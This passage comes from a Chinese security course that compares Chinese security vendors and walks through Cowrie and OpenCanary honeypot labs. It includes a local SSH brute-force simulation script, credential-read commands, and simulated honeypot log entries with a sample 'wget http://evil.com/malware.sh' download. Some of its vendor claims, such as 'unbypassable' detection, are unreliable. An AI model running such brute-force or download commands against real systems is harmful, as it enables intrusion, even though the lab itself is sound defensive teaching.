    核心价值：统一安全管理，日志+合规+事件+风险+态势

安恒信息（Day 40-42）—— 专而精的专科医院
├── 明御WAF：ML白名单建模引擎
├── 明御DAS：数据库审计（旁路零影响+三层关联）
├── 堡垒机：运维安全审计（高危指令拦截+会话录像）
├── AiLPHA：AI态势感知（UEBA+威胁狩猎）
└── 玄武盾：云WAF+DDoS+CDN SaaS化
    核心价值：Web安全专家+数据安全新贵+AI先行者

长亭科技（Day 43-44）—— CTF冠军团队
├── 雷池WAF：语义分析引擎（不可绕过，误报<0.01%）
├── 洞鉴Xray：被动+主动扫描+漏洞管理
├── 谛听：欺骗防御（蜜罐+蜜标+蜜饵）
└── 牧云CWPP：容器+K8s+主机安全
    核心价值：技术极致，从攻击者视角设计防御
```

### 18.2 第二层 vs 第一层对比

| 维度 | 第一层（深信服/奇安信/华为） | 第二层（启明/安恒/长亭） |
|------|---------------------------|------------------------|
| **厂商规模** | 大型（千人以上） | 中大型 |
| **产品线** | 10+条，全覆盖 | 3-5条，聚焦 |
| **技术路线** | 全面均衡 | 纵深突破 |
| **代表产品** | 下一代防火墙/EDR/态势感知 | SOC/语义WAF/欺骗防御 |
| **适用企业** | 所有类型 | 有专项需求的企业 |
| **采购方式** | 全家桶 | 单品突破 |
| **技术深度** | ★★★★ | ★★★★★ |
| **技术广度** | ★★★★★ | ★★★★ |

### 18.3 关键知识图谱

```
第二层厂商核心知识图谱

安全管理：
├── 泰合SOC五大模块（启明星辰）
├── AiLPHA AI分析（安恒信息）
└── 洞鉴漏洞管理（长亭科技）

Web安全：
├── 天清WAF规则引擎（启明星辰）
├── 明御WAF ML引擎（安恒信息）
└── 雷池WAF语义引擎（长亭科技）

数据安全：
├── 天玥数据库审计（启明星辰）
├── 明御DAS三层关联（安恒信息）
└── 堡垒机运维审计（安恒信息）

主动防御：
├── 天阗IDS/IPS（启明星辰）
├── 玄武盾云防护（安恒信息）
└── 谛听欺骗防御（长亭科技）

云原生：
├── 云安全资源池（启明星辰）
├── 云安全一站式（安恒信息）
└── 牧云CWPP（长亭科技）

WAF技术路线对比（重点）：
├── 规则引擎：天清WAF → 可绕过
├── ML引擎：明御WAF → 概率检测
└── 语义引擎：雷池WAF → 不可绕过
```

---

## 19. 实操实验：部署Cowrie蜜罐模拟谛听欺骗防御

### 19.1 实验目标

使用开源的Cowrie蜜罐来模拟谛听欺骗防御体系的核心功能：
- 部署SSH/Telnet蜜罐
- 观察攻击者的行为
- 理解蜜罐如何收集威胁情报

---

## 20. 实验一：部署Cowrie SSH蜜罐

### 步骤1：环境准备

```bash
mkdir -p ~/deception-lab
cd ~/deception-lab
```

### 步骤2：使用Docker部署Cowrie

```bash
cat > docker-compose.yml << 'EOF'
version: '3.8'

services:
  cowrie:
    image: cowrie/cowrie:latest
    container_name: cowrie-honeypot
    ports:
      - "2222:2222"   # SSH蜜罐端口
      - "2223:2223"   # Telnet蜜罐端口
    volumes:
      - ./cowrie/etc:/cowrie/cowrie-git/etc
      - ./cowrie/log:/cowrie/cowrie-git/log
      - ./cowrie/dl:/cowrie/cowrie-git/dl
    restart: always
    networks:
      - honeypot-net

  # ELK用于日志分析（可选，资源不足可跳过）
  elasticsearch:
    image: docker.elastic.co/elasticsearch/elasticsearch:7.17.0
    container_name: hp-es
    environment:
      - discovery.type=single-node
      - "ES_JAVA_OPTS=-Xms512m -Xmx512m"
      - xpack.security.enabled=false
    ports:
      - "9200:9200"
    networks:
      - honeypot-net

  kibana:
    image: docker.elastic.co/kibana/kibana:7.17.0
    container_name: hp-kibana
    environment:
      - ELASTICSEARCH_HOSTS=http://elasticsearch:9200
    ports:
      - "5601:5601"
    depends_on:
      - elasticsearch
    networks:
      - honeypot-net

networks:
  honeypot-net:
    driver: bridge
EOF

# 创建必要目录
mkdir -p cowrie/etc cowrie/log cowrie/dl

# 启动Cowrie
docker-compose up -d cowrie

# 查看Cowrie日志
docker-compose logs -f cowrie
```

### 步骤3：配置Cowrie

```bash
# Cowrie配置文件
cat > ~/deception-lab/cowrie/etc/cowrie.cfg << 'EOF'
[honeypot]
# SSH配置
ssh_port = 2222
telnet_port = 2223

# 主机名伪装
hostname = db-prod-01

# 允许的认证方式
auth_class = UserPass

# 模拟的文件系统
filesystem_file = fs.pickle

# 下载文件保存路径
download_path = /cowrie/cowrie-git/dl

# 输出插件
[output_jsonlog]
enabled = true
logfile = /cowrie/cowrie-git/log/cowrie.json

[output_csvlog]
enabled = true
logfile = /cowrie/cowrie-git/log/cowrie.csv
EOF
```

---

## 21. 实验二：配置蜜罐诱饵

### 步骤1：在蜜罐中放置诱饵文件

```bash
# 创建诱饵脚本（蜜罐内的假文件）
cat > ~/deception-lab/setup_bait.sh << 'SCRIPT'
#!/bin/bash

# 这个脚本用于在Cowrie蜜罐内设置诱饵

echo "在Cowrie蜜罐中配置诱饵..."

# Cowrie使用Docker，进入容器
docker exec cowrie-honeypot bash -c '
# 创建假的凭据文件
mkdir -p /cowrie/cowrie-git/honeyfs/etc
mkdir -p /cowrie/cowrie-git/honeyfs/root
mkdir -p /cowrie/cowrie-git/honeyfs/home/admin

# 假数据库配置
cat > /cowrie/cowrie-git/honeyfs/etc/db_config.conf << "BAIT"
# Database Configuration
# Production MySQL Server
DB_HOST=10.0.1.50
DB_PORT=3306
DB_USER=db_admin
DB_PASS=P@ssw0rd2024!
DB_NAME=production_db

# Backup Server
BACKUP_HOST=10.0.1.51
BACKUP_USER=backup_svc
BACKUP_PASS=Backup#2024!
BAIT

# 假SSH密钥
cat > /cowrie/cowrie-git/honeyfs/root/.ssh/id_rsa << "BAIT"
-----BEGIN RSA PRIVATE KEY-----
MIIEpAIBAAKCAQEA0Z3EqF5V7Gq2KkXjN8pLmV9wRb3yHs4TfWjQa2x5kVmE
(假的SSH私钥，任何使用都会被检测到)
-----END RSA PRIVATE KEY-----
BAIT

# 假密码文件
cat > /cowrie/cowrie-git/honeyfs/root/passwords.txt << "BAIT"
=== 服务器密码列表 ===
生产服务器 root/Prod@2024#Secure
测试服务器 root/Test@2024#Dev
数据库服务器 root/DB@2024#Admin
=== 请勿外传 ===
BAIT

# 假工资文件
cat > /cowrie/cowrie-git/honeyfs/home/admin/salary_2026.xlsx.csv << "BAIT"
姓名,部门,职位,月薪,年奖
张三,技术部,高级工程师,35000,150000
李四,技术部,架构师,45000,200000
王五,财务部,财务总监,50000,250000
(此为蜜饵文件，任何访问都会被记录)
BAIT

echo "诱饵文件已配置完成"
'

echo "蜜罐诱饵设置完成！"
SCRIPT

chmod +x ~/deception-lab/setup_bait.sh
./setup_bait.sh
```

---

## 22. 实验三：攻击模拟与告警验证

### 步骤1：模拟攻击者行为

```bash
cat > ~/deception-lab/simulate_attack.sh << 'SCRIPT'
#!/bin/bash

HONEYPOT_HOST="localhost"
SSH_PORT="2222"

echo "=========================================="
echo "  模拟攻击者访问蜜罐"
echo "=========================================="
echo ""

echo "1. 扫描蜜罐端口..."
nmap -p 2222,2223 $HONEYPOT_HOST 2>/dev/null || echo "  (nmap不可用，跳过端口扫描)"

echo ""
echo "2. 尝试SSH登录（暴力破解）..."
echo "  尝试: root/admin123"
sshpass -p "admin123" ssh -o StrictHostKeyChecking=no -p $SSH_PORT root@$HONEYPOT_HOST "whoami" 2>&1 || echo "  (sshpass不可用，跳过SSH测试)"

echo ""
echo "3. 尝试其他凭据..."
for pass in "password" "123456" "root" "admin" "test" "P@ssw0rd"; do
    echo "  尝试: root/$pass"
    sshpass -p "$pass" ssh -o StrictHostKeyChecking=no -o ConnectTimeout=3 -p $SSH_PORT root@$HONEYPOT_HOST "exit" 2>/dev/null
done 2>/dev/null || echo "  (使用telnet替代尝试)"
    
# 使用telnet模拟
echo ""
echo "4. Telnet尝试..."
(echo "root"; sleep 1; echo "admin123"; sleep 1; echo "ls -la"; sleep 1; echo "cat /etc/passwd"; sleep 2) | telnet $HONEYPOT_HOST $SSH_PORT 2>/dev/null || echo "  (telnet测试完成)"

echo ""
echo "=========================================="
echo "  攻击模拟完成，查看蜜罐日志"
echo "=========================================="
SCRIPT

chmod +x ~/deception-lab/simulate_attack.sh
```

### 步骤2：查看蜜罐捕获的数据

```bash
cat > ~/deception-lab/view_captures.sh << 'SCRIPT'
#!/bin/bash

echo "=========================================="
echo "  蜜罐捕获数据查看"
echo "=========================================="
echo ""

echo "--- Cowrie JSON日志（最近20条）---"
docker exec cowrie-honeypot cat /cowrie/cowrie-git/log/cowrie.json 2>/dev/null | tail -20 | python3 -m json.tool 2>/dev/null || \
docker exec cowrie-honeypot cat /cowrie/cowrie-git/log/cowrie.json 2>/dev/null | tail -20

echo ""
echo "--- 下载的文件 ---"
docker exec cowrie-honeypot ls -la /cowrie/cowrie-git/dl/ 2>/dev/null || echo "  (暂无下载文件)"

echo ""
echo "--- Cowrie进程状态 ---"
docker exec cowrie-honeypot ps aux 2>/dev/null | head -10

echo ""
echo "=========================================="
echo "  蜜罐正在运行，监听端口："
echo "  SSH蜜罐: localhost:2222"
echo "  Telnet蜜罐: localhost:2223"
echo "=========================================="
SCRIPT

chmod +x ~/deception-lab/view_captures.sh
./view_captures.sh
```

### 步骤3：编写蜜罐告警分析脚本

```bash
cat > ~/deception-lab/honeypot_analyzer.py << 'PYEOF'
#!/usr/bin/env python3
"""
蜜罐告警分析器
模拟谛听欺骗防御的告警分析功能
"""

import json
import os
from datetime import datetime
from collections import defaultdict, Counter

class HoneypotAnalyzer:
    """蜜罐数据分析器"""
    
    def __init__(self):
        self.events = []
        self.attackers = defaultdict(list)
        self.credentials = []
        self.commands = []
    
    def add_event(self, event):
        """添加蜜罐事件"""
        self.events.append(event)
        
        src_ip = event.get('src_ip', 'unknown')
        self.attackers[src_ip].append(event)
        
        if 'username' in event and 'password' in event:
            self.credentials.append({
                'ip': src_ip,
                'username': event['username'],
                'password': event['password'],
                'timestamp': event.get('timestamp', '')
            })
        
        if 'command' in event:
            self.commands.append({
                'ip': src_ip,
                'command': event['command'],
                'timestamp': event.get('timestamp', '')
            })
    
    def generate_report(self):
        """生成分析报告"""
        print("=" * 60)
        print("  谛听蜜罐欺骗防御分析报告")
        print("=" * 60)
        print(f"  报告时间: {datetime.now().isoformat()}")
        print(f"  总事件数: {len(self.events)}")
        print(f"  攻击者IP数: {len(self.attackers)}")
        print()
        
        print("--- 攻击者TOP 10 ---")
        attacker_counts = Counter()
        for ip, events in self.attackers.items():
            attacker_counts[ip] = len(events)
        
        for ip, count in attacker_counts.most_common(10):
            print(f"  {ip}: {count}次事件")
        
        print()
        print("--- 捕获的凭据 ---")
        for cred in self.credentials[:20]:
            print(f"  [{cred['ip']}] {cred['username']}:{cred['password']}")
        
        if len(self.credentials) > 20:
            print(f"  ... 共{len(self.credentials)}组凭据")
        
        print()
        print("--- 攻击者执行的命令 ---")
        for cmd in self.commands[:20]:
            print(f"  [{cmd['ip']}] {cmd['command']}")
        
        print()
        print("--- 威胁情报输出 ---")
        print("  可用于封禁的IP列表:")
        for ip in list(attacker_counts.keys())[:10]:
            print(f"    {ip}")
        
        print()
        print("--- 攻击特征总结 ---")
        if self.credentials:
            top_users = Counter(c['username'] for c in self.credentials)
            top_passes = Counter(c['password'] for c in self.credentials)
            print(f"  最常见用户名: {top_users.most_common(3)}")
            print(f"  最常见密码: {top_passes.most_common(3)}")
        
        print()
        print("=" * 60)


# 模拟蜜罐数据
def simulate_honeypot_data():
    """模拟蜜罐收集的数据"""
    analyzer = HoneypotAnalyzer()
    
    # 模拟攻击事件
    events = [
        # 攻击者1：来自俄罗斯的SSH暴力破解
        {"src_ip": "185.220.101.34", "event": "connection", "timestamp": "2026-06-18T10:00:01"},
        {"src_ip": "185.220.101.34", "event": "login_attempt", "username": "root", "password": "admin123", "timestamp": "2026-06-18T10:00:05"},
        {"src_ip": "185.220.101.34", "event": "login_attempt", "username": "root", "password": "password", "timestamp": "2026-06-18T10:00:08"},
        {"src_ip": "185.220.101.34", "event": "login_attempt", "username": "root", "password": "123456", "timestamp": "2026-06-18T10:00:11"},
        {"src_ip": "185.220.101.34", "event": "login_success", "username": "root", "password": "root", "timestamp": "2026-06-18T10:00:15"},
        {"src_ip": "185.220.101.34", "event": "command", "command": "uname -a", "timestamp": "2026-06-18T10:00:20"},
        {"src_ip": "185.220.101.34", "event": "command", "command": "cat /etc/passwd", "timestamp": "2026-06-18T10:00:25"},
        {"src_ip": "185.220.101.34", "event": "command", "command": "wget http://evil.com/malware.sh", "timestamp": "2026-06-18T10:00:30"},
        
        # 攻击者2：来自中国的端口扫描
        {"src_ip": "103.224.182.253", "event": "connection", "timestamp": "2026-06-18T10:05:00"},
        {"src_ip": "103.224.182.253", "event": "login_attempt", "username": "admin", "password": "admin", "timestamp": "2026-06-18T10:05:05"},
        
        # 攻击者3：来自美国的自动化攻击
        {"src_ip": "45.33.32.156", "event": "connection", "timestamp": "2026-06-18T10:10:00"},
        {"src_ip": "45.33.32.156", "event": "login_attempt", "username": "root", "password": "P@ssw0rd", "timestamp": "2026-06-18T10:10:03"},
        {"src_ip": "45.33.32.156", "event": "login_attempt", "username": "ubuntu", "password": "ubuntu", "timestamp": "2026-06-18T10:10:06"},
        {"src_ip": "45.33.32.156", "event": "login_attempt", "username": "admin", "password": "admin123", "timestamp": "2026-06-18T10:10:09"},
    ]
    
    for event in events:
        analyzer.add_event(event)
    
    analyzer.generate_report()


if __name__ == "__main__":
    simulate_honeypot_data()
PYEOF

python3 ~/deception-lab/honeypot_analyzer.py
```

---

## 23. 实验四：部署OpenCanary多协议蜜罐

### 步骤1：部署OpenCanary

```bash
cd ~/deception-lab

# OpenCanary配置
cat > opencanary.conf << 'EOF'
{
    "device.node_id": "deception-node-01",
    "device.desc": "长亭谛听模拟节点",
    
    "logger": {
        "class": "PyLogger",
        "kwargs": {
            "handlers": {
                "JSONFileHandler": {
                    "class": "logging.FileHandler",
                    "filename": "/var/log/opencanary/opencanary.log"
                }
            }
        }
    },
    
    "ssh.port": 22,
    "ssh.enabled": true,
    "ssh.version": "OpenSSH_7.4p1",
    
    "mysql.port": 3306,
    "mysql.enabled": true,
    "mysql.version": "5.7.33",
    
    "redis.port": 6379,
    "redis.enabled": true,
    
    "http.port": 80,
    "http.enabled": true,
    "http.skin": "basic",
    
    "ftp.port": 21,
    "ftp.enabled": true,
    
    "rdp.port": 3389,
    "rdp.enabled": true,
    
    "sip.port": 5060,
    "sip.enabled": false
}
EOF

echo "OpenCanary配置文件已创建"
echo "提示：OpenCanary建议在独立虚拟机中部署"
echo "Docker部署命令（参考）："
echo "docker run -d --name opencanary --network host -v $(pwd)/opencanary.conf:/etc/opencanaryd/opencanary.conf opencanary/opencanary"
```

---

## 24. 验收练习

### 基础题（必答）

**Q1：谛听欺骗防御体系的三大核心组件是什么？各自的作用是什么？**

<details>
<summary>点击查看答案</summary>

1. **蜜罐（Honeypot）**：模拟真实服务，吸引和捕获攻击者，记录攻击行为
2. **蜜标（Honey Token）**：嵌入在真实系统中的虚假凭证，一旦被使用即触发告警，检测已渗透到内网的攻击者
3. **蜜饵（Honey File/Canary File）**：放置在关键位置的诱饵文件，一旦被访问即触发告警，检测数据窃取行为

</details>

**Q2：洞鉴Xray的被动扫描和主动扫描有什么区别？各自适合什么场景？**

<details>
<summary>点击查看答案</summary>

被动扫描：
- 分析正常业务流量，不主动发包
- 零影响，适合生产环境持续监控
- 能发现信息泄露、反射型漏洞等
- 不会触发WAF

主动扫描：
- 主动发送探测请求
- 覆盖更全面，适合上线前检查
- 能发现所有类型漏洞
- 可能被WAF拦截

</details>

**Q3：牧云CWPP保护哪三个层面的安全？**

<details>
<summary>点击查看答案</summary>

1. 容器安全：镜像扫描、运行时防护、漏洞管理
2. Kubernetes安全：集群合规、RBAC审计、网络策略
3. 主机安全：入侵检测、漏洞管理、合规基线

</details>

### 进阶题（选答）

**Q4：谛听欺骗防御相比传统IDS有什么核心优势？**

<details>
<summary>点击查看答案</summary>

核心优势：
1. 误报率接近0%：正常用户不会触碰蜜罐/蜜标/蜜饵
2. 可检测未知攻击：不需要签名，攻击者触碰假目标就会告警
3. 攻击溯源：完整记录攻击行为，收集TTP
4. 主动防御：增加攻击者不确定性，提高攻击成本
5. 威胁情报：从蜜罐收集真实的攻击数据

</details>

**Q5：长亭科技的四款产品（雷池、洞鉴、谛听、牧云）如何协同？**

<details>
<summary>点击查看答案</summary>

协同场景：
- 洞鉴发现漏洞 → 雷池配置虚拟补丁临时防护 → 开发团队修复
- 雷池拦截Web攻击 → 谛听蜜罐捕获绕过WAF的攻击者 → 牧云检测容器横向移动
- 谛听收集攻击者TTP → 雷池更新防护策略 → 洞鉴检查是否有对应漏洞
- 四者数据汇总 → 统一安全运营平台 → 全面态势感知

</details>

---

## 25. 今日总结

### 核心收获

今天，我们完成了长亭科技另外三款核心产品的学习，并完成了整个第二层厂商（Day 37-44）的学习：

**1. 洞鉴Xray**
- 被动扫描+主动扫描双引擎
- 被动扫描分析正常流量，零影响
- 主动扫描全面覆盖漏洞类型
- 漏洞全生命周期管理

**2. 谛听欺骗防御**
- 蜜罐：模拟真实服务，诱捕攻击者
- 蜜标：虚假凭证，检测内网渗透
- 蜜饵：诱饵文件，检测数据窃取
- 核心优势：误报接近0%，主动诱捕

**3. 牧云CWPP**
- 容器安全：镜像扫描+运行时防护
- K8s安全：合规检查+RBAC审计
- 主机安全：入侵检测+漏洞管理

**4. 第二层厂商学习完成**
- 启明星辰：安全管理专家（SOC）
- 安恒信息：专而精的专科医院（Web+数据安全）
- 长亭科技：CTF冠军团队（技术极致）

### 记忆口诀

```
长亭三日学完毕：
雷池语义不可绕，洞鉴双扫找漏洞
谛听蜜罐抓攻击，牧云守护云原生
第二层厂全学完，专项安全更深入
```

### 后续学习方向

恭喜你完成了第二层所有厂商（Day 37-44）的学习！你可以：
1. 回顾第一层和第二层的知识对比
2. 选择自己感兴趣的方向深入学习
3. 进行综合实验，搭建完整的安全防护体系

---

> **今日格言**：最好的防御不是筑更高的墙，而是让攻击者不知道自己面对的是墙还是陷阱——这就是欺骗防御的智慧。

> **扩展思考**：如果你要为一家中型互联网公司设计安全架构，你会如何组合第一层和第二层厂商的产品？请画出产品部署架构图。
